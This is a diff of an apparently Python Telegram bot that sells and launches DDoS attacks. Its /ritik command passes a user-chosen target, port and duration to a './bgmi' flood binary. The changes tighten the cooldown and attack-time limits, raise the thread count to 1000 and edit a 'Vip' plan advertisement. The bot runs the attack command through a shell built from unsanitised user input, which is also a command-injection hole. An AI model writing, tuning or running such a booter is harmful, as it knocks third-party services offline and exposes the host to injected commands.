@@ -285,7 +285,7 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /ritik command
 ritik_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME =30
 
 # Handler for /ritik command
 @bot.message_handler(commands=['ritik'])
@@ -307,13 +307,13 @@ def handle_ritik(message):
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
-            if time > 180:
-                response = "Error: Time interval must be less than 180."
+            if time > 80:
+                response = "Error: Time interval must be less than 80."
             else:
                 record_command_logs(user_id, '/ritik', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
+                full_command = f"./bgmi {target} {port} {time} 1000"
                 process = subprocess.run(full_command, shell=True)
                 response = f"ritik Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
@@ -395,7 +395,7 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 180 (S)
+-> Attack Time : 80 (S)
 > After Attack Limit : 10 sec
 -> Concurrents Attack : 5
 
